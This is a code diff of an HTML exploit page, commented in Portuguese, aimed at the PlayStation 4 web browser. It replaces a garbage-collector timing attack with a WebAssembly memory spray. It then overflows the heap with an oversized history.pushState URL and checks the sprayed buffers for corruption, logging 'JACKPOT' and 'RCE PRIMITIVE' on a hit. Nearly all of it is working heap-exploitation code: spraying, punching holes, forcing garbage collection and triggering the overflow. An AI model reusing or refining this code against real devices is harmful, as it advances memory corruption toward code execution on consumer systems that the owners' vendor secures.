@@ -1,34 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 GC Sniper (400MB / 64MB Alloc)</title>
+    <title>PS4 WebAssembly Memory Clash</title>
     <style>
-        body { background-color: #001a1a; color: #00ffff; font-family: monospace; padding: 20px; text-align: center; }
-        button { 
-            font-size: 24px; padding: 25px; width: 100%; border: 2px solid #00ffff; background: #000; color: #fff; font-weight: bold; cursor: pointer;
-            box-shadow: 0 0 20px #00ffff;
-        }
-        #log { margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111; text-align: left;}
-        .win { background-color: #00ffff; color: #000; font-weight: bold; font-size: 1.2em; border: 2px solid white; padding: 10px;}
+        body { background-color: #200; color: #f0f; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #f0f; background: #000; color: #fff; cursor: pointer; }
+        #log { margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
+        .win { background-color: #f0f; color: #000; font-weight: bold; font-size: 1.4em; border: 2px solid white; padding: 15px;}
     </style>
 </head>
 <body>
 
-    <h1>GC Sniper (400MB Trigger)</h1>
-    <p>Atacando no momento exato da limpeza de memória.</p>
+    <h1>Ataque WebAssembly (Wasm Clash)</h1>
+    <p>Tentando colidir a String do pushState com memória WebAssembly (mmap vs mmap).</p>
 
-    <button onclick="startSniper()">INICIAR ATAQUE AOS 400MB</button>
+    <button onclick="startWasmAttack()">INICIAR PROTOCOLO WASM</button>
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
+        // O offset alinhado que descobrimos
         const ALIGNED_OFFSET = 709520;
-        const OVERFLOW_AMT = 1024 * 64; 
-        
-        // O alvo agora é um Titã de 64MB
-        const TITAN_SIZE = 64 * 1024 * 1024; 
+        const OVERFLOW_AMT = 1024 * 1024 * 2; // 2MB de overflow agressivo
 
-        var filler = [];
-        
+        // Configuração do Wasm
+        // 1 Page = 64KB. 
+        // 256 Pages = 16MB.
+        const WASM_PAGES = 256; 
+        const SPRAY_COUNT = 60;
+
+        var victims = [];
+        var views = [];
+
         function log(msg, type) {
             const el = document.getElementById('log');
             let style = type === 'win' ? 'class="win"' : '';
@@ -36,52 +38,56 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startSniper() {
-            log("1. Enchendo memória até o Gatilho do GC (400 MB)...");
+        async function startWasmAttack() {
+            if (typeof WebAssembly === 'undefined') {
+                log("Erro: WebAssembly não suportado neste navegador.");
+                return;
+            }
 
-            let count = 0;
+            log(`1. Alocando ${SPRAY_COUNT} Memórias Wasm de 16MB...`);
+
             try {
-                // Para exatamente em 400
-                while(count < 400) { 
-                    let ab = new ArrayBuffer(1024 * 1024 * 1); // 1MB
-                    let view = new Uint8Array(ab);
-                    view[0] = 0xAA; 
-                    filler.push(ab);
-                    count++;
+                // FASE 1: SPRAY WASM
+                for(let i=0; i<SPRAY_COUNT; i++) {
+                    // Cria memória Wasm
+                    let mem = new WebAssembly.Memory({initial: WASM_PAGES, maximum: WASM_PAGES});
                     
-                    if(count % 20 === 0) {
-                        log(`Alocados: ${count} MB...`);
-                        await new Promise(r => setTimeout(r, 10)); 
-                    }
+                    // Cria uma "view" (janela) para ler essa memória
+                    let view = new Uint32Array(mem.buffer);
+                    
+                    // Marca o início com 0xCCCCCCCC
+                    view[0] = 0xCCCCCCCC;
+                    view[1024] = 0xCCCCCCCC;
+                    
+                    victims.push(mem);
+                    views.push(view);
                 }
             } catch(e) {
-                log(`Erro inesperado durante alocação: ${e.message}`);
+                log("Erro na alocação Wasm (OOM): " + e.message);
             }
 
-            log("2. Gatilho atingido. Preparando terreno...");
-            
-            // Cria alguns buracos recentes para o exploit entrar
-            // Removemos os últimos 10 blocos alocados
-            let total = filler.length;
-            for(let i=0; i<10; i++) {
-                if (filler[total - 1 - i]) filler[total - 1 - i] = null;
+            // FASE 2: BURACOS
+            log("2. Criando buracos no Heap Wasm...");
+            // Apaga referências intercaladas
+            for(let i=0; i<victims.length; i+=2) {
+                victims[i] = null;
+                views[i] = null;
             }
-            
-            // Pequena pausa para o GC rodar naturalmente
-            await new Promise(r => setTimeout(r, 500));
 
-            log("3. Disparando Overflow (Criando Chunk Falso)...");
+            await forceGC();
+
+            // FASE 3: EXPLOIT
+            log("3. Disparando Overflow (0x01)...");
 
             setTimeout(() => {
                 try {
                     let buffer = "A".repeat(ALIGNED_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
                     
-                    history.pushState({}, "sniper", "/" + buffer);
+                    history.pushState({}, "wasm_pwn", "/" + buffer);
 
-                    // FASE 4: O PEDIDO GIGANTE
-                    log("4. Solicitando Bloco de 64MB...");
-                    checkBigAlloc();
+                    log("4. Verificando corrupção nas memórias Wasm...");
+                    checkWasmCorruption();
 
                 } catch (e) {
                     log("Erro no Exploit: " + e.message);
@@ -89,35 +95,43 @@
             }, 500);
         }
 
-        function checkBigAlloc() {
-            try {
-                // Tenta alocar 64MB
-                let ghostBuffer = new ArrayBuffer(TITAN_SIZE);
-                let ghostView = new Uint8Array(ghostBuffer);
+        function checkWasmCorruption() {
+            let success = false;
 
-                log("Alocação de 64MB realizada!");
+            // Checa as views que sobraram
+            for(let i=1; i<views.length; i+=2) {
+                let view = views[i];
+                if(!view) continue;
+
+                // Wasm Memory é protegida, mas se o overflow mmap cair em cima,
+                // vamos ver os dados mudarem.
                 
-                // VERIFICAÇÃO:
-                // Se o buffer vier sujo com 0xAA (dos blocos de 1MB que soltamos)
-                // ou com 0x01 (do nosso exploit), vencemos.
-                
-                let byte0 = ghostView[0];
-                let byte1000 = ghostView[1000];
-                
-                if (byte0 === 0xAA || byte0 === 1) {
-                    log("!!! JACKPOT - OVERLAP DETECTADO !!!", 'win');
-                    log(`Byte encontrado: 0x${byte0.toString(16)}`, 'win');
-                    alert("RCE PRIMITIVE: 64MB OVERLAP!");
-                } else if (byte0 === 0) {
-                    log("Resultado: Memória Limpa (0x00). O sistema achou um espaço vazio real.");
-                } else {
-                    log(`Resultado Curioso: Dados encontrados: 0x${byte0.toString(16)}`);
+                // Procuramos pelo byte 0x01 repetido.
+                // Como lemos como Uint32, 0x01010101 = 16843009
+                if (view[0] === 16843009 || view[0] === 0x01010101) {
+                    log(`!!! JACKPOT !!! Wasm ${i} foi sobrescrito!`, 'win');
+                    alert("WASM MEMORY CORRUPTED!");
+                    success = true;
+                    break;
                 }
-
-            } catch(e) {
-                log("Falha na alocação (OOM): " + e.message);
-                log("O sistema não conseguiu achar 64MB contínuos.");
+                
+                // Se mudou de 0xCCCCCCCC para qualquer outra coisa
+                if (view[0] !== 0xCCCCCCCC) {
+                     log(`!!! ANOMALIA !!! Wasm ${i} alterado para 0x${view[0].toString(16)}`, 'win');
+                     success = true;
+                     break;
+                }
             }
+
+            if(!success) {
+                log("Nenhuma memória Wasm atingida.");
+                log("O isolamento mmap entre String e Wasm parece ativo.");
+            }
+        }
+
+        async function forceGC() {
+            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 800));
         }
     </script>
 </body>
